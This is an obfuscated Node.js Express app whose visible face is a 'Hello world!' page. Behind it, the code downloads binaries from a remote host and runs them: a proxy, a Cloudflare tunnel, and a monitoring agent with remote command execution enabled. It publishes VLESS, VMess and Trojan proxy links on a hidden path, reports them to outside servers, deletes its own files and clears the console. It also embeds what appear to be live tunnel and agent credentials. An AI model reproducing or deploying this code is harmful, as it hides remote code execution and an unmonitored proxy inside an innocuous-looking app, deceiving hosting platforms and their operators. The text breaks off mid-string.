const _0x20269a=_0x5298;(function(_0x23b877,_0x25fc23){const _0x241bf4=_0x5298,_0x5820a0=_0x23b877();while(!![]){try{const _0x49d3bc=parseInt(_0x241bf4(0x1a2))/0x1+parseInt(_0x241bf4(0x1ee))/0x2+-parseInt(_0x241bf4(0x1ed))/0x3+parseInt(_0x241bf4(0x1d8))/0x4*(-parseInt(_0x241bf4(0x1e3))/0x5)+-parseInt(_0x241bf4(0x22f))/0x6+parseInt(_0x241bf4(0x215))/0x7*(parseInt(_0x241bf4(0x1d2))/0x8)+parseInt(_0x241bf4(0x1c3))/0x9;if(_0x49d3bc===_0x25fc23)break;else _0x5820a0['push'](_0x5820a0['shift']());}catch(_0x466b18){_0x5820a0['push'](_0x5820a0['shift']());}}}(_0xa82f,0x9395a));const _0x19b870=(function(){let _0x406efa=!![];return function(_0xcb9aaf,_0x55cf9f){const _0x1eb280=_0x406efa?function(){const _0x291b11=_0x5298;if(_0x55cf9f){const _0x36787=_0x55cf9f[_0x291b11(0x1e4)](_0xcb9aaf,arguments);return _0x55cf9f=null,_0x36787;}}:function(){};return _0x406efa=![],_0x1eb280;};}()),_0x10fb9c=_0x19b870(this,function(){const _0x453917=_0x5298;return _0x10fb9c[_0x453917(0x1bd)]()[_0x453917(0x23a)]('(((.+)+)+)+$')[_0x453917(0x1bd)]()['constructor'](_0x10fb9c)[_0x453917(0x23a)](_0x453917(0x229));});_0x10fb9c();const _0x25a841=(function(){let _0x3706a0=!![];return function(_0x34cc4c,_0x51f71d){const _0x501049=_0x3706a0?function(){if(_0x51f71d){const _0x1571ae=_0x51f71d['apply'](_0x34cc4c,arguments);return _0x51f71d=null,_0x1571ae;}}:function(){};return _0x3706a0=![],_0x501049;};}()),_0xafb0ae=_0x25a841(this,function(){const _0x4081af=_0x5298;let _0x3199a5;try{const _0x2b4217=Function(_0x4081af(0x248)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x3199a5=_0x2b4217();}catch(_0xbe386b){_0x3199a5=window;}const _0x1218d6=_0x3199a5[_0x4081af(0x188)]=_0x3199a5[_0x4081af(0x188)]||{},_0x1c6843=[_0x4081af(0x1a4),'warn',_0x4081af(0x1d9),_0x4081af(0x1c2),'exception',_0x4081af(0x202),_0x4081af(0x1c6)];for(let _0x159ec0=0x0;_0x159ec0<_0x1c6843[_0x4081af(0x18d)];_0x159ec0++){const _0x488958=_0x25a841['constructor'][_0x4081af(0x1a8)][_0x4081af(0x222)](_0x25a841),_0x50403f=_0x1c6843[_0x159ec0],_0x4f74f6=_0x1218d6[_0x50403f]||_0x488958;_0x488958[_0x4081af(0x1b4)]=_0x25a841['bind'](_0x25a841),_0x488958['toString']=_0x4f74f6[_0x4081af(0x1bd)][_0x4081af(0x222)](_0x4f74f6),_0x1218d6[_0x50403f]=_0x488958;}});_0xafb0ae();const express=require(_0x20269a(0x241)),app=express(),axios=require(_0x20269a(0x1d5)),os=require('os'),fs=require('fs'),path=require(_0x20269a(0x18f)),{promisify}=require('util'),exec=promisify(require(_0x20269a(0x1fc))['exec']),{execSync}=require(_0x20269a(0x1fc)),UPLOAD_URL=process['env'][_0x20269a(0x243)]||'',PROJECT_URL=process[_0x20269a(0x1ff)][_0x20269a(0x1d0)]||'',AUTO_ACCESS=process[_0x20269a(0x1ff)][_0x20269a(0x24b)]||!![],FILE_PATH=process[_0x20269a(0x1ff)]['FILE_PATH']||_0x20269a(0x19f),SUB_PATH=process[_0x20269a(0x1ff)][_0x20269a(0x1f3)]||'jianxianapp',PORT=process['env'][_0x20269a(0x1d4)]||process['env'][_0x20269a(0x189)]||0xbb8,UUID=process['env'][_0x20269a(0x1b5)]||_0x20269a(0x19b),NEZHA_SERVER=process[_0x20269a(0x1ff)]['NEZHA_SERVER']||_0x20269a(0x24d),NEZHA_PORT=process[_0x20269a(0x1ff)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x20269a(0x1ff)]['NEZHA_KEY']||_0x20269a(0x240),ARGO_DOMAIN=process[_0x20269a(0x1ff)][_0x20269a(0x227)]||_0x20269a(0x1f9),ARGO_AUTH=process['env'][_0x20269a(0x209)]||_0x20269a(0x1ac),ARGO_PORT=process[_0x20269a(0x1ff)]['ARGO_PORT']||0x1f41,CFIP=process[_0x20269a(0x1ff)][_0x20269a(0x21a)]||_0x20269a(0x211),CFPORT=process[_0x20269a(0x1ff)]['CFPORT']||0x1bb,NAME=process['env'][_0x20269a(0x1ce)]||_0x20269a(0x1a6);!fs['existsSync'](FILE_PATH)?(fs[_0x20269a(0x1f6)](FILE_PATH),console[_0x20269a(0x1a4)](FILE_PATH+_0x20269a(0x1bf))):console[_0x20269a(0x1a4)](FILE_PATH+_0x20269a(0x23c));function generateRandomName(){const _0x588ff4=_0x20269a,_0x319293=_0x588ff4(0x1ae);let _0x865804='';for(let _0x3c7587=0x0;_0x3c7587<0x6;_0x3c7587++){_0x865804+=_0x319293[_0x588ff4(0x20e)](Math[_0x588ff4(0x205)](Math[_0x588ff4(0x193)]()*_0x319293[_0x588ff4(0x18d)]));}return _0x865804;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x5298(_0xdda56f,_0x24260e){const _0x5795be=_0xa82f();return _0x5298=function(_0xafb0ae,_0x25a841){_0xafb0ae=_0xafb0ae-0x185;let _0x8a317c=_0x5795be[_0xafb0ae];return _0x8a317c;},_0x5298(_0xdda56f,_0x24260e);}let npmPath=path[_0x20269a(0x1ef)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x20269a(0x1ef)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x20269a(0x1ef)](FILE_PATH,_0x20269a(0x1a3)),listPath=path['join'](FILE_PATH,_0x20269a(0x200)),bootLogPath=path[_0x20269a(0x1ef)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x20269a(0x1b3));function deleteNodes(){const _0x353811=_0x20269a;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x1709b2;try{_0x1709b2=fs[_0x353811(0x22b)](subPath,_0x353811(0x1b1));}catch{return null;}const _0x21f54d=Buffer[_0x353811(0x197)](_0x1709b2,'base64')[_0x353811(0x1bd)](_0x353811(0x1b1)),_0x2d1219=_0x21f54d[_0x353811(0x212)]('\x0a')['filter'](_0x5c1cac=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x353811(0x1f8)](_0x5c1cac));if(_0x2d1219['length']===0x0)return;return axios[_0x353811(0x1f7)](UPLOAD_URL+_0x353811(0x1cf),JSON[_0x353811(0x247)]({'nodes':_0x2d1219}),{'headers':{'Content-Type':'application/json'}})[_0x353811(0x1cd)](_0x2f9a48=>{return null;}),null;}catch(_0x4dc8cf){return null;}}function cleanupOldFiles(){const _0x21117f=_0x20269a;try{const _0x338327=fs[_0x21117f(0x216)](FILE_PATH);_0x338327[_0x21117f(0x1a7)](_0x2b8bda=>{const _0x1e85e1=_0x21117f,_0x547570=path[_0x1e85e1(0x1ef)](FILE_PATH,_0x2b8bda);try{const _0x699fcc=fs['statSync'](_0x547570);_0x699fcc[_0x1e85e1(0x187)]()&&fs[_0x1e85e1(0x217)](_0x547570);}catch(_0x36e480){}});}catch(_0x4642e8){}}app[_0x20269a(0x245)]('/',function(_0x3763aa,_0x28ecd5){const _0xfda3d0=_0x20269a;_0x28ecd5[_0xfda3d0(0x246)]('Hello\x20world!');});async function generateConfig(){const _0x2d2679=_0x20269a,_0x2150e8={'log':{'access':_0x2d2679(0x1f4),'error':_0x2d2679(0x1f4),'loglevel':_0x2d2679(0x214)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2d2679(0x1fe),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x2d2679(0x1ba),'dest':0xbba},{'path':_0x2d2679(0x1ad),'dest':0xbbb},{'path':_0x2d2679(0x1d7),'dest':0xbbc}]},'streamSettings':{'network':_0x2d2679(0x198)}},{'port':0xbb9,'listen':_0x2d2679(0x244),'protocol':_0x2d2679(0x1fe),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':_0x2d2679(0x244),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2d2679(0x214)},'streamSettings':{'network':'ws','security':_0x2d2679(0x214),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2d2679(0x235),_0x2d2679(0x233),_0x2d2679(0x249)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x2d2679(0x1c0),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2d2679(0x1ad)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2d2679(0x233),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2d2679(0x244),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2d2679(0x214),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2d2679(0x235),_0x2d2679(0x233),_0x2d2679(0x249)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x2d2679(0x23d),'tag':'direct'},{'protocol':_0x2d2679(0x218),'tag':'block'}]};fs['writeFileSync'](path[_0x2d2679(0x1ef)](FILE_PATH,_0x2d2679(0x1b3)),JSON['stringify'](_0x2150e8,null,0x2));}function getSystemArchitecture(){const _0x4ab3cf=_0x20269a,_0x47a85e=os[_0x4ab3cf(0x206)]();return _0x47a85e===_0x4ab3cf(0x1a0)||_0x47a85e===_0x4ab3cf(0x24a)||_0x47a85e===_0x4ab3cf(0x22e)?_0x4ab3cf(0x1a0):'amd';}function downloadFile(_0x450e0e,_0x1a4ee2,_0x5a6731){const _0x49a731=_0x20269a,_0x70160c=_0x450e0e;!fs[_0x49a731(0x1c1)](FILE_PATH)&&fs[_0x49a731(0x1f6)](FILE_PATH,{'recursive':!![]});const _0x5cb05c=fs[_0x49a731(0x20d)](_0x70160c);axios({'method':_0x49a731(0x245),'url':_0x1a4ee2,'responseType':'stream'})[_0x49a731(0x192)](_0x245192=>{const _0x2b3d62=_0x49a731;_0x245192['data'][_0x2b3d62(0x23f)](_0x5cb05c),_0x5cb05c['on'](_0x2b3d62(0x20c),()=>{const _0x2d4ab7=_0x2b3d62;_0x5cb05c[_0x2d4ab7(0x1ab)](),console['log']('Download\x20'+path[_0x2d4ab7(0x203)](_0x70160c)+_0x2d4ab7(0x1e9)),_0x5a6731(null,_0x70160c);}),_0x5cb05c['on'](_0x2b3d62(0x1c2),_0x1e3bde=>{const _0x1d85cc=_0x2b3d62;fs['unlink'](_0x70160c,()=>{});const _0x433af6=_0x1d85cc(0x22a)+path[_0x1d85cc(0x203)](_0x70160c)+_0x1d85cc(0x1b0)+_0x1e3bde[_0x1d85cc(0x191)];console[_0x1d85cc(0x1c2)](_0x433af6),_0x5a6731(_0x433af6);});})[_0x49a731(0x1cd)](_0x759732=>{const _0x4c21d2=_0x49a731,_0xefd8d3='Download\x20'+path['basename'](_0x70160c)+'\x20failed:\x20'+_0x759732[_0x4c21d2(0x191)];console[_0x4c21d2(0x1c2)](_0xefd8d3),_0x5a6731(_0xefd8d3);});}async function downloadFilesAndRun(){const _0x35da22=_0x20269a,_0x2461a0=getSystemArchitecture(),_0x2b5937=getFilesForArchitecture(_0x2461a0);if(_0x2b5937[_0x35da22(0x18d)]===0x0){console[_0x35da22(0x1a4)](_0x35da22(0x1b7));return;}const _0x4c7fed=_0x2b5937['map'](_0x1dc6d7=>{return new Promise((_0x46d8d2,_0x221da1)=>{const _0x302c41=_0x5298;downloadFile(_0x1dc6d7[_0x302c41(0x242)],_0x1dc6d7['fileUrl'],(_0x39a356,_0x35e0be)=>{_0x39a356?_0x221da1(_0x39a356):_0x46d8d2(_0x35e0be);});});});try{await Promise[_0x35da22(0x1bb)](_0x4c7fed);}catch(_0x1aad2a){console[_0x35da22(0x1c2)](_0x35da22(0x22c),_0x1aad2a);return;}function _0x5578cc(_0x24992f){const _0x604fbd=_0x35da22,_0x323fc3=0x1fd;_0x24992f[_0x604fbd(0x1a7)](_0x3e92d7=>{const _0xc4b6fb=_0x604fbd;fs[_0xc4b6fb(0x1c1)](_0x3e92d7)&&fs[_0xc4b6fb(0x1db)](_0x3e92d7,_0x323fc3,_0x129548=>{const _0x4e01e0=_0xc4b6fb;_0x129548?console[_0x4e01e0(0x1c2)](_0x4e01e0(0x1e0)+_0x3e92d7+':\x20'+_0x129548):console['log'](_0x4e01e0(0x23e)+_0x3e92d7+':\x20'+_0x323fc3['toString'](0x8));});});}const _0x53ef18=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5578cc(_0x53ef18);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x6675c5=NEZHA_SERVER[_0x35da22(0x1b8)](':')?NEZHA_SERVER[_0x35da22(0x212)](':')[_0x35da22(0x1cb)]():'',_0x195ea8=new Set([_0x35da22(0x1e6),'8443','2096','2087','2083',_0x35da22(0x1df)]),_0x5ad859=_0x195ea8[_0x35da22(0x230)](_0x6675c5)?'true':_0x35da22(0x1e2),_0x5e2b1b=_0x35da22(0x18b)+NEZHA_KEY+_0x35da22(0x1de)+NEZHA_SERVER+_0x35da22(0x1ca)+_0x5ad859+_0x35da22(0x196)+UUID;fs[_0x35da22(0x22d)](path[_0x35da22(0x1ef)](FILE_PATH,'config.yaml'),_0x5e2b1b);const _0x297d96=_0x35da22(0x213)+phpPath+_0x35da22(0x1bc)+FILE_PATH+_0x35da22(0x24c);try{await exec(_0x297d96),console[_0x35da22(0x1a4)](phpName+_0x35da22(0x1c4)),await new Promise(_0x406fc7=>setTimeout(_0x406fc7,0x3e8));}catch(_0x1a35bf){console['error']('php\x20running\x20error:\x20'+_0x1a35bf);}}else{let _0x3c8c1e='';const _0x3dd46b=[_0x35da22(0x1e6),'8443',_0x35da22(0x210),_0x35da22(0x1f5),_0x35da22(0x199),_0x35da22(0x1df)];_0x3dd46b['includes'](NEZHA_PORT)&&(_0x3c8c1e='--tls');const _0x313abc='nohup\x20'+npmPath+_0x35da22(0x1fb)+NEZHA_SERVER+':'+NEZHA_PORT+_0x35da22(0x21d)+NEZHA_KEY+'\x20'+_0x3c8c1e+_0x35da22(0x207);try{await exec(_0x313abc),console[_0x35da22(0x1a4)](npmName+_0x35da22(0x1c4)),await new Promise(_0x1a4497=>setTimeout(_0x1a4497,0x3e8));}catch(_0x123558){console[_0x35da22(0x1c2)](_0x35da22(0x1d3)+_0x123558);}}}else console['log'](_0x35da22(0x1d6));const _0x5a26ac='nohup\x20'+webPath+_0x35da22(0x220)+FILE_PATH+_0x35da22(0x23b);try{await exec(_0x5a26ac),console[_0x35da22(0x1a4)](webName+_0x35da22(0x1c4)),await new Promise(_0x45f4c4=>setTimeout(_0x45f4c4,0x3e8));}catch(_0x4ace96){console[_0x35da22(0x1c2)](_0x35da22(0x232)+_0x4ace96);}if(fs[_0x35da22(0x1c1)](botPath)){let _0x396b98;if(ARGO_AUTH[_0x35da22(0x231)](/^[A-Z0-9a-z=]{120,250}$/))_0x396b98=_0x35da22(0x1cc)+ARGO_AUTH;else ARGO_AUTH[_0x35da22(0x231)](/TunnelSecret/)?_0x396b98=_0x35da22(0x1af)+FILE_PATH+_0x35da22(0x190):_0x396b98=_0x35da22(0x1a9)+FILE_PATH+_0x35da22(0x1da)+ARGO_PORT;try{await exec(_0x35da22(0x213)+botPath+'\x20'+_0x396b98+_0x35da22(0x228)),console[_0x35da22(0x1a4)](botName+_0x35da22(0x1c4)),await new Promise(_0x5f0297=>setTimeout(_0x5f0297,0x7d0));}catch(_0x397dde){console[_0x35da22(0x1c2)](_0x35da22(0x1a5)+_0x397dde);}}await new Promise(_0x522206=>setTimeout(_0x522206,0x1388));}function getFilesForArchitecture(_0x435146){const _0x423571=_0x20269a;let _0x3936a2;_0x435146===_0x423571(0x1a0)?_0x3936a2=[{'fileName':webPath,'fileUrl':_0x423571(0x1fd)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x3936a2=[{'fileName':webPath,'fileUrl':_0x423571(0x226)},{'fileName':botPath,'fileUrl':_0x423571(0x21b)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5b0e67=_0x435146===_0x423571(0x1a0)?_0x423571(0x18e):_0x423571(0x195);_0x3936a2['unshift']({'fileName':npmPath,'fileUrl':_0x5b0e67});}else{const _0x19e27c=_0x435146===_0x423571(0x1a0)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x3936a2[_0x423571(0x21c)]({'fileName':phpPath,'fileUrl':_0x19e27c});}}return _0x3936a2;}function argoType(){const _0x4d47e1=_0x20269a;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4d47e1(0x1a4)](_0x4d47e1(0x1b2));return;}if(ARGO_AUTH[_0x4d47e1(0x1b8)](_0x4d47e1(0x1e5))){fs[_0x4d47e1(0x22d)](path[_0x4d47e1(0x1ef)](FILE_PATH,_0x4d47e1(0x1d1)),ARGO_AUTH);const _0xcac90f=_0x4d47e1(0x21f)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x4d47e1(0x1d1))+_0x4d47e1(0x1e7)+ARGO_DOMAIN+_0x4d47e1(0x1e1)+ARGO_PORT+_0x4d47e1(0x194);fs[_0x4d47e1(0x22d)](path[_0x4d47e1(0x1ef)](FILE_PATH,_0x4d47e1(0x19c)),_0xcac90f);}else console[_0x4d47e1(0x1a4)](_0x4d47e1(0x219));}argoType();async function extractDomains(){const _0x853303=_0x20269a;let _0x1de4bf;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1de4bf=ARGO_DOMAIN,console[_0x853303(0x1a4)](_0x853303(0x1c5),_0x1de4bf),await _0x3432bd(_0x1de4bf);else try{const _0x410470=fs[_0x853303(0x22b)](path[_0x853303(0x1ef)](FILE_PATH,_0x853303(0x19e)),_0x853303(0x1b1)),_0x56e95f=_0x410470[_0x853303(0x212)]('\x0a'),_0x534c6d=[];_0x56e95f[_0x853303(0x1a7)](_0x391118=>{const _0x5a30af=_0x853303,_0x4d1e79=_0x391118[_0x5a30af(0x231)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4d1e79){const _0xcf14ce=_0x4d1e79[0x1];_0x534c6d['push'](_0xcf14ce);}});if(_0x534c6d['length']>0x0)_0x1de4bf=_0x534c6d[0x0],console[_0x853303(0x1a4)](_0x853303(0x225),_0x1de4bf),await _0x3432bd(_0x1de4bf);else{console[_0x853303(0x1a4)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x853303(0x217)](path[_0x853303(0x1ef)](FILE_PATH,_0x853303(0x19e)));async function _0x1a8c5f(){const _0x28e100=_0x853303;try{process['platform']===_0x28e100(0x20a)?await exec(_0x28e100(0x221)+botName+_0x28e100(0x1b6)):await exec(_0x28e100(0x185)+botName['charAt'](0x0)+']'+botName[_0x28e100(0x18a)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x13926f){}}_0x1a8c5f(),await new Promise(_0x5afbe1=>setTimeout(_0x5afbe1,0xbb8));const _0x5b752f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5b752f+'\x20>/dev/null\x202>&1\x20&'),console[_0x853303(0x1a4)](botName+_0x853303(0x1c4)),await new Promise(_0x423dd4=>setTimeout(_0x423dd4,0xbb8)),await extractDomains();}catch(_0x4de2d0){console[_0x853303(0x1c2)](_0x853303(0x1a5)+_0x4de2d0);}}}catch(_0x5f5a91){console[_0x853303(0x1c2)]('Error\x20reading\x20boot.log:',_0x5f5a91);}async function _0x3432bd(_0x403c49){const _0x1176f4=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':'utf-8'}),_0x1257fe=_0x1176f4['trim'](),_0x4582f6=NAME?NAME+'-'+_0x1257fe:_0x1257fe;return new Promise(_0x29a53e=>{setTimeout(()=>{const _0x45b152=_0x5298,_0x3abf0b={'v':'2','ps':''+_0x4582f6,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x45b152(0x214),'net':'ws','type':_0x45b152(0x214),'host':_0x403c49,'path':_0x45b152(0x1c8),'tls':_0x45b152(0x233),'sni':_0x403c49,'alpn':'','fp':_0x45b152(0x1e8)},_0x17e44e=_0x45b152(0x1dd)+UUID+'@'+CFIP+':'+CFPORT+_0x45b152(0x24e)+_0x403c49+_0x45b152(0x1f0)+_0x403c49+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x4582f6+_0x45b152(0x238)+Buffer['from'](JSON['stringify'](_0x3abf0b))[_0x45b152(0x1bd)](_0x45b152(0x1b9))+_0x45b152(0x1ec)+UUID+'@'+CFIP+':'+CFPORT+_0x45b152(0x20b)+_0x403c49+_0x45b152(0x1f0)+_0x403c49+_0x45b152(0x224)+_0x4582f6+_0x45b152(0x208);console[_0x45b152(0x1a4)](Buffer[_0x45b152(0x197)](_0x17e44e)[_0x45b152(0x1bd)](_0x45b152(0x1b9))),fs[_0x45b152(0x22d)](subPath,Buffer['from'](_0x17e44e)[_0x45b152(0x1bd)]('base64')),console[_0x45b152(0x1a4)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x2c029c,_0x8de57)=>{const _0xcca2c0=_0x45b152,_0x4cff59=Buffer['from'](_0x17e44e)['toString'](_0xcca2c0(0x1b9));_0x8de57[_0xcca2c0(0x236)](_0xcca2c0(0x201),_0xcca2c0(0x1f2)),_0x8de57[_0xcca2c0(0x246)](_0x4cff59);}),_0x29a53e(_0x17e44e);},0x7d0);});}}async function uploadNodes(){const _0x2af352=_0x20269a;if(UPLOAD_URL&&PROJECT_URL){const _0x272037=PROJECT_URL+'/'+SUB_PATH,_0x450399={'subscription':[_0x272037]};try{const _0x4fbb95=await axios[_0x2af352(0x1f7)](UPLOAD_URL+_0x2af352(0x1c7),_0x450399,{'headers':{'Content-Type':'application/json'}});return _0x4fbb95&&_0x4fbb95[_0x2af352(0x21e)]===0xc8?(console[_0x2af352(0x1a4)](_0x2af352(0x239)),_0x4fbb95):null;}catch(_0x56509a){if(_0x56509a[_0x2af352(0x204)]){if(_0x56509a[_0x2af352(0x204)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2af352(0x1c1)](listPath))return;const _0x1d494e=fs[_0x2af352(0x22b)](listPath,_0x2af352(0x1b1)),_0x597628=_0x1d494e[_0x2af352(0x212)]('\x0a')[_0x2af352(0x1ea)](_0x4339f5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2af352(0x1f8)](_0x4339f5));if(_0x597628['length']===0x0)return;const _0x20f310=JSON[_0x2af352(0x247)]({'nodes':_0x597628});try{const _0xcf829f=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x20f310,{'headers':{'Content-Type':_0x2af352(0x1be)}});return _0xcf829f&&_0xcf829f[_0x2af352(0x21e)]===0xc8?(console[_0x2af352(0x1a4)]('Nodes\x20uploaded\x20successfully'),_0xcf829f):null;}catch(_0x3038a0){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xfbc7f7=_0x5298,_0x4b43ea=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4b43ea[_0xfbc7f7(0x1a1)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4b43ea[_0xfbc7f7(0x1a1)](phpPath);process[_0xfbc7f7(0x1fa)]===_0xfbc7f7(0x20a)?exec('del\x20/f\x20/q\x20'+_0x4b43ea[_0xfbc7f7(0x1ef)]('\x20')+_0xfbc7f7(0x223),_0x4ff7bd=>{const _0x5f2b25=_0xfbc7f7;console['clear'](),console['log'](_0x5f2b25(0x1f1)),console[_0x5f2b25(0x1a4)](_0x5f2b25(0x19d));}):exec(_0xfbc7f7(0x237)+_0x4b43ea['join']('\x20')+_0xfbc7f7(0x234),_0xcec879=>{const _0x3b7690=_0xfbc7f7;console[_0x3b7690(0x1eb)](),console[_0x3b7690(0x1a4)]('App\x20is\x20running'),console[_0x3b7690(0x1a4)](_0x3b7690(0x19d));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1c8ad4=_0x20269a;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1c8ad4(0x1a4)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x1b4369=await axios['post'](_0x1c8ad4(0x186),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1c8ad4(0x1be)}});return console['log'](_0x1c8ad4(0x1c9)),_0x1b4369;}catch(_0x4c8fb4){return console[_0x1c8ad4(0x1c2)](_0x1c8ad4(0x20f)+_0x4c8fb4['message']),null;}}function _0xa82f(){const _0x158922=['listen','\x0avless://','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','2053','Empowerment\x20failed\x20for\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','false','5WBZdlN','apply','TunnelSecret','443','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','firefox','\x20successfully','filter','clear','\x0a\x20\x20\x0atrojan://','3093411OjWMaI','679788ZVJMCf','join','&fp=firefox&type=ws&host=','App\x20is\x20running','text/plain;\x20charset=utf-8','SUB_PATH','/dev/null','2087','mkdirSync','post','test','phala.jianxian.nyc.mn','platform','\x20-s\x20','child_process','https://arm64.ssss.nyc.mn/web','vless','env','list.txt','Content-Type','table','basename','response','floor','arch','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x20\x20','ARGO_AUTH','win32','?security=tls&sni=','finish','createWriteStream','charAt','Add\x20automatic\x20access\x20task\x20faild:\x20','2096','104.18.4.250','split','nohup\x20','none','7385ZJlCSU','readdirSync','unlinkSync','blackhole','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','CFIP','https://amd64.ssss.nyc.mn/bot','unshift','\x20-p\x20','status','\x0a\x20\x20tunnel:\x20','\x20-c\x20','taskkill\x20/f\x20/im\x20','bind','\x20>\x20nul\x202>&1','&path=%2Ftrojan-argo%3Fed%3D2560#','ArgoDomain:','https://amd64.ssss.nyc.mn/web','ARGO_DOMAIN','\x20>/dev/null\x202>&1\x20&','(((.+)+)+)+$','Download\x20','readFileSync','Error\x20downloading\x20files:','writeFileSync','aarch64','371910SBUIvM','has','match','web\x20running\x20error:\x20','tls','\x20>/dev/null\x202>&1','http','set','rm\x20-rf\x20','\x0a\x20\x20\x0avmess://','Subscription\x20uploaded\x20successfully','search','/config.json\x20>/dev/null\x202>&1\x20&','\x20already\x20exists','freedom','Empowerment\x20success\x20for\x20','pipe','OFYPZJ6hEEHEDvJa2LuaDJNQBqincIbu','express','fileName','UPLOAD_URL','127.0.0.1','get','send','stringify','return\x20(function()\x20','quic','arm64','AUTO_ACCESS','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','jianxian.apkk.cloudns.org:56880','?encryption=none&security=tls&sni=','pkill\x20-f\x20\x22[','https://oooo.serv00.net/add-url','isFile','console','PORT','substring','\x0aclient_secret:\x20','Error\x20in\x20startserver:','length','https://arm64.ssss.nyc.mn/agent','path','/tunnel.yml\x20run','message','then','random','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://amd64.ssss.nyc.mn/agent','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','from','tcp','2083','Unhandled\x20error\x20in\x20startserver:','0c524a06-80a4-4cb2-809a-8751c7ee4000','tunnel.yml','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','boot.log','./tmp','arm','push','479950lRmShH','sub.txt','log','Error\x20executing\x20command:\x20','Phala','forEach','prototype','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','http\x20server\x20is\x20running\x20on\x20port:','close','eyJhIjoiZTNlYmU5NDY1NjJjOGZjMjBmYzg4Y2U5MGJlODRjYTMiLCJ0IjoiM2Q0MWM5ODItOGE3Mi00MDQ0LWJiMDktNWZhNzdkMGMyM2M0IiwicyI6Ik1URXpOMlJsWmpndE9EWmxOQzAwT1daakxXRTJZV1F0TXpsa016QXlNbU5tTXpCayJ9','/vmess-argo','abcdefghijklmnopqrstuvwxyz','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20failed:\x20','utf-8','ARGO_DOMAIN\x20or\x20ARGO